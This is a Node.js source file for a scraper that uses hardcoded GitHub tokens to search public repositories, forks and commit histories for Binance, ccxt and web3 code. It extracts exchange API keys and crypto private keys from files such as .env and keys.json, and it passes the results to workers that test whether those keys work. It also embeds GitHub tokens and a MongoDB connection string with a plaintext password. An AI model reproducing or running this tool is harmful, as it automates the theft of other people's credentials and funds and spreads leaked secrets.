import  { Octokit } from '@octokit/rest';
import moment from 'moment';
import ccxt from 'ccxt';
import mongoose, { Mongoose, PromiseProvider } from 'mongoose';
import GitHubRepoParser from './githubRepoParser';
import models from './models';
import Promise from 'bluebird';
import { convert } from 'html-to-text';
//import { parseForBinanceKeys,  parseForCoinbaseKeys, parseForMongoDatabaseUrls, parseForPrivateKeys, testKeys } from './workers';
import { spawn, Thread, Worker} from 'threads'
import { makeOctokitRequest } from './middlewares';



const repoQueryOptions = [
  'binance trading bot',
  'crypto arbitrage',
  'python binance',
  'binance api'
]

const Sentry = require('@sentry/node')
const Trading = require('@sentry/tracing')


Sentry.init({
  dsn: "https://1ff02f3dcce144aaaaa7b424918555f8@o1362299.ingest.sentry.io/6653686",
  integrations: [
    // enable HTTP calls tracing
    new Sentry.Integrations.Http({ tracing: true }),
  ],

  // Set tracesSampleRate to 1.0 to capture 100%
  // of transactions for performance monitoring.
  // We recommend adjusting this value in production
  tracesSampleRate: 1.0,
});




let jon = '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'
let user32 = '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'
let eaglesfan = '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'







let ghAccounts = [  jon ]
let ghAccount = ghAccounts[Math.floor(Math.random() * ghAccounts.length)]
let parser



const initGithubAccounts = async () => {
  let accounts = []
  return Promise.map(ghAccounts, async account => {
    let temp = new Octokit({
      auth:  account
    })
    const rateLimitData = await temp.rateLimit.get()
    console.log(rateLimitData)
    //console.log(rateLimitData)
    if(rateLimitData.data.rate.remaining > 0) {
      return accounts.push({ghAccount: temp, callsRemaining: rateLimitData.data.rate.remaining})
    }
    else {

      console.log('account not available until', moment().fromNow(rateLimitData.data.rate.reset))
      //console.log('but lets try anyway')
      //accounts.push(temp)
    }
  }).then(() => {
    if(accounts.length === 0) {
      console.log('no accounts available')
      process.exit()
    }
    else {
      console.log('using', accounts.length)
    }
    return Promise.resolve(accounts.sort((a, b) => a.callsRemaining > b.callsRemaining))
  })
}









const pickRandomUrl = urls => {
  return urls[Math.floor(Math.random() * urls.length)]
}


async function followRepos(query,  ghAccount, page) {
  let urlsQueried = []
  let reposAlreadyLookedAt = 0
  let percentageDone
  // setInterval(() => checkStatus(percentageDone), 20000)
  
  console.log('parsing repos, query is', query, 'page is', page, ghAccount !== undefined)
  const initialRepos = await makeOctokitRequest(ghAccount.rest.search.repos({
    q: query,
    order: 'asc',
    page,
    sort: 'best-match',
    per_page: 100
  }), ghAccount)
  let nodes = initialRepos.data.data.items
  console.log('working with', nodes.length)
  
  let uniqueRepos = new Set(nodes)
  let uniqueRepoArray = Array.from(uniqueRepos)
  let promises = []
  //console.log(uniqueRepoArray.map(item => item))
  Promise.each(uniqueRepoArray, async () => {
    const randomRepo = pickRandomUrl(uniqueRepoArray)
    let repoInDb = await mongoose.model('repos').findOne({html_url: randomRepo.html_url})
   // console.log('repo in db', repoInDb)
   if(repoInDb) {
    reposAlreadyLookedAt +=1
    percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, totalRepos: ${uniqueRepoArray.length}, page: ${page} lookedAt: ${reposAlreadyLookedAt}, reposAlreadyLookedAt: ${reposAlreadyLookedAt}, url: ${randomRepo.html_url} `;
    //console.log('skipping repo')

    //console.log(percentageDone)
    return Promise.resolve(randomRepo)
   }

  else {
      return handleRepo(randomRepo, ghAccount).then(() => {
        reposAlreadyLookedAt += 1
        percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, totalRepos: ${uniqueRepoArray.length}, page: ${page}, lookedAt: ${reposAlreadyLookedAt},  reposAlreadyLookedAt: ${reposAlreadyLookedAt}, url: ${randomRepo.html_url} `;
        console.log(percentageDone)
        mongoose.model('repos').create(randomRepo).then(res => res.save()).then(() => console.log('repo saved'))
      }).catch(err => {
        Sentry.captureException(err)
      })
    }
  
  })
  

}
async function parseForks(query) {
  let gh = shuffleAccounts(query)
  const initialRepos = await gh.rest.search.repos({
    q:repoQueryOptions[Math.floor(Math.random() * repoQueryOptions.length)],
    order: 'asc',
    sort: 'committer-date',
    per_page: 1
  })
  const repoInstances = initialRepos.data.items
  return Promise.map(repoInstances, async repo => {
    let gh2 = shuffleAccounts(query) // so its harder to rate limit me
    let forks = await gh2.rest.repos.listForks({
      owner: repo.owner.login,
      repo: repo.name
    })
    const forkInstances = forks.data
    return Promise.map(forkInstances, async forkedRepo => {
      let error = false
      const gh3 = shuffleAccounts(query)
      console.log(forkedRepo.name)
      let commitsForFork
      try {
        commitsForFork = await gh3.rest.repos.listCommits({
          owner: forkedRepo.owner.login,
          repo: forkedRepo.name
        })
      }
      catch(err) {
        error = true
        console.log('error getting commits for fork', forkedRepo.name, err.status)
      }
      if(!error) {
        const commitItems = commitsForFork.data;
        Promise.map(commitItems, async commit => {
          const gh4 = shuffleAccounts(query)
          const parents = commit.parents
          return Promise.map(parents, async parent => {
            const tree = await gh4.rest.git.getTree({
              owner: forkedRepo.owner.login,
              repo: forkedRepo.name,
              tree_sha: parent.sha
            })
            const files = tree.data.tree;
            return Promise.map(files, async file => {
              const gh5 = shuffleAccounts(query)
              const content = await gh5.rest.repos.getContent({
                owner: forkedRepo.owner.login,
                repo: forkedRepo.name,
                path: file.path
              })
              return parse(content).then(testKeys)
            })
          })
        })
      }
     
    })
    
  })
  return  gh.rest.search.repos({q: query, page, order:'asc', sort: 'indexed', per_page: 100})
   .then(res => {
    console.log(query, res.data.items.length)
     let items = res.data.items
     //console.log('first', res.data.items[0])
     let missed = 0
     return Promise.map(items, async item => {
      //console.log(item)
      //console.log('item', item.name, item.html_url)
      const owner = item.owner.login
      const repoName = item.html_url.split('/')[4]
      let forks = await gh.rest.repos.listForks({
        owner,
        repo:repoName
      })
      let f = forks.data
      Promise.map(f, async fork => {
        console.log('got fork', fork !== undefined)
        let commits = await gh.rest.repos.listCommits({
          owner: fork.owner.login,
          repo: fork.name
        })
        const d = commits.data
        Promise.map(d, commit => {
          const parents = commit.parents
          Promise.map(parents, async parent => {
            const tree = await gh.rest.git.getTree({
              owner: fork.owner.login,
              repo: fork.name,
              tree_sha: parent.sha
            })
            console.log('got tree', tree !== undefined)
            const files = tree.data.tree
            Promise.map(files, async file => {
              const content = await gh.repos.getContent({
                owner: fork.owner.login,
                repo: fork.name,
                path: file.path
              })
              console.log('got content of file', content !== undefined)
              return parse(content).then(testKey)
              
            })
           
          })
        })
      })
    }).catch(err => err)
  }).catch(err => err)
}



   


//should be able to parse the files and commits at the same time
// I offloaded both tasks to seperate worker threads.
const handleRepo = async (repo, ghAccount) => {
  console.log('repo added to queue', repo.name)
  let work = []
  const data = await parser.collectData(repo.html_url)
  const commits = await makeOctokitRequest(ghAccount.rest.repos.listCommits({
    owner: repo.owner.login,
    repo: repo.name
  }), ghAccount)
  
  
  const shouldIgnore = ['gitignore', 'scss', 'DS_STORE', 'log', 'firebaserc', 'Miscellaneous', 'state', 'gitkeep', 'prettierrc', 'babelrc', 'pub', 'priv', 'gif', 'dockerignore', 'example', 'yml', 'prettierignore', 'jpg', 'eslintrc', 'lock', 'cjs', 'woff', 'sss', 'woff2', 'ttf', 'ico', 'map', 'gitattributes', 'eot', 'css', 'mp4', 'svg', 'ui', 'png', 'md']
  let files = []
  let filesChecked = 0

  //console.log('data', data)
  Object.keys(data).map(k => {
    if(k === 'env') {
      console.log('env found', data[k])
    }
    if(shouldIgnore.indexOf(k) === -1) {
      
      data[k].forEach(url => {
        files.push(url)
      })
    }
   
      
    })
  // const commitParser = await spawn(new Worker('./workers/parseCommits'))
//  let commitPromiseChain =  await commitParser(commits.data.data).then(async res => {
//     console.log('finished parsing commits', res)
//     await Thread.terminate(commitParser)
//   })
  files = files.filter(item => item.indexOf('node_modules') === -1).filter(item => item.indexOf('robots.txt') === -1)
  
  return Promise.each(files, async (file, index) => {
    return makeOctokitRequest(ghAccount.request(`GET ${file}`), ghAccount).then(async res => {
      if(typeof res.data.data === 'object') {
        console.log('skipping file')
       return Promise.resolve(file)
      }
      let text = convert(res.data.data, {
        wordwrap: 130
      })
      
      let fileParser = await spawn(new Worker('./workers/parseFile'))
      let result = await fileParser(text)
      // await Thread.terminate(fileParser)
      return result
    })
      
  })
  
}
const followCommits = async (query, gh, page) => {
  return makeOctokitRequest(gh.rest.search.commits({q:query, page, per_page:100}), gh).then(async data => {
    let commitParser = await spawn(new Worker('./workers/parseCommits'))
    await commitParser(data.data.data.items).then(() => {
      console.log('need more commits', query)
      // return Thread.terminate(commitParser)
    })
  })

}

// returns an array of codefiles in utf-8 format
const collectFiles = async (query, ghAccount, page) => {
  
  const code = await makeOctokitRequest(ghAccount.rest.search.code({
    q: query,
    order: 'asc',
    sort: 'indexed',
    per_page: 100,
    page
  }), ghAccount).catch(err => err)

  //console.log(uniqueRepoArray.map(item => item))
  return Promise.map(code.data.data.items, async (item, index) => {
    const content = await makeOctokitRequest(ghAccount.rest.git.getBlob({
      owner: item.repository.owner.login,
      repo: item.repository.name,
      file_sha: item.sha
    }), ghAccount)
    
    const codeFile = Buffer.from(content.data.data.content, 'base64').toString('utf-8')
    return Promise.resolve({content: codeFile, repository:item.repository})
  })
}




        


const runAction = (actionType, query, ghAccount, page) => {
  switch(actionType) {
    case 'parseCode':
      return parseCode(query, ghAccount, page).catch(console.log)
    case 'parseForks':
      return parseForks(query)
    case 'followRepos':
      return followRepos(query, ghAccount, page)
    case 'followCommits':
      return followCommits(query, ghAccount, page)
    default:
      followRepos(query)
  }
}


const runNormal = async () => {
  
  console.log('running normally')
  const work = []
  initGithubAccounts().then(async accounts => {
    console.log('got accounts', accounts.length)
    let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
    parser = new GitHubRepoParser(ghAccount)
    let page = Math.floor(Math.random() * (10 - 1 + 1) + 1)
    const topicCount = await mongoose.model('repos').countDocuments({ topics: { $exists: true, $not: {$size: 0} } })
    var random = Math.floor(Math.random() * topicCount)
    const query = 'delete .env'
    console.log('topics', topicCount)
    let queryForRepo = 'web3'
    work.push(runAction('parseCode', "require('node-binance-api')", ghAccount, page))
    work.push(runAction('parseCode', 'import binance:', ghAccount, page))
    work.push(runAction('parseCode', 'from binance import Client:', ghAccount, page))
    work.push(runAction('parseCode', 'ccxt.binance({apiKey:})', ghAccount, page))
   // work.push(runAction('followRepos', queryForRepo, ghAccount, page))
    //work.push(runAction('followCommits', query, ghAccount, page))
    return Promise.all(work)
   
  })
   
}

const privKeyScannerEther = async () => {
  const ghAccount = await await initGithubAccounts()
  const gh = ghAccount[0]
  const libraries = ['web3', 'ether', 'web3-core-helpers', ]
  const paths = ['./priv.json', './keys.json', './config.json', './config/configKey.json', '.env', './private.json', './privateKey.json']
  
  Promise.each(libraries, async library => {
    let files = await fetchCode(`require(${library})`, gh, 2)
    Promise.each(files, async file => {
      let {repository} = file
      const {owner:{login}, name} = repository
      const work = Promise.map(paths, path => {
        return makeOctokitRequest(gh.repos.getContent({
          owner: login,
          name,
          path
        }), gh).then(res => {
          if(res) {
            console.log('found res', res)
          }
        })
      })
      return Promise.all(work)
      
    })
  })
 

  // const work = Promise.map(libraries, async library => {
  //   return runAction('parseCode', `require(${library})`, ghAccount, page)
  // })
}

//returns the account with the mode api calls available

const save = () => {
  console.log()
}
const lookForBinanceKeys = async () => {
  console.log('Looking for binance Keys')
  const work = []
  const queries = ["from binance import Client"]
  const page = 1
  initGithubAccounts()
  .then(accounts => accounts[1])
  .then(account => {
    return Promise.each(queries, async query =>{
      return collectFiles(query, account.ghAccount, 1).then(async res => {
        return Promise.each(res, async file => {
          let fileParser = await spawn(new Worker('./workers/parseFile'))
          let result = await fileParser(file.content)
          console.log(result)
          return result
        })
      
      })
    })
  })
 
  // initGithubAccounts().then(async accounts => {
  //   let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
  //   parser = new GitHubRepoParser(ghAccount)
  //   let page = Math.floor(Math.random() * (10 - 1 + 1) + 1)
  //   //
  //   //work.push(runAction('followRepos', queryForRepo, ghAccount, page))
  //  // work.push(runAction('followCommits', query, ghAccount, page))
  //   return Promise.all(work)
   
  // })
}
const removeRepos = () => {
  return mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
  mongoose.model('repos').remove().then(console.log)
})
}

const start =  async () => {
  
  process.on('uncaughtException', (err) => Sentry.captureException(err))
  process.on('unhandledRejection', (err) => {
    console.log(err)
    Sentry.captureException(err)
  })
  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
    console.log('connected to db')
    setInterval(() => lookForBinanceKeys(), 600000)// 10 minutes
    startInitial()
  })
}

 const filePromiseChain = () => {
  
}  
 const query = 'BINANCE_API_KEY'
 initGithubAccounts().then(accounts => {

   const ghAccount = accounts[0].ghAccount
   for(let i = 0; i <= 6; i++) {
    collectFiles(query, ghAccount, i).then(res => {
    return Promise.each(res, async file => {
     const parser = await spawn(new Worker("./workers/parseFile"))
     const result = await parser(file.content)
     const privateKeys = result.privateKeys
     console.log("got private keys", privateKeys)
     console.log("got binance keys", result.binanceKeys)

     if(privateKeys.length > 0) {
        const privateKeyTester = await spawn(new Worker("./workers/testPrivateKeys.js"))
        const cryptoAccounts = await privateKeyTester(privateKeys)
        console.log("cryptoaccounts", cryptoAccounts)
    }
    if(result.binanceKeys.length > 0) {
     const binanceKeyTester = await spawn(new Worker("./workers/testBinanceKeys.js"))
     const results = await binanceKeyTester(result.binanceKeys)
     console.log(results)
    }
   })
  })}
 })

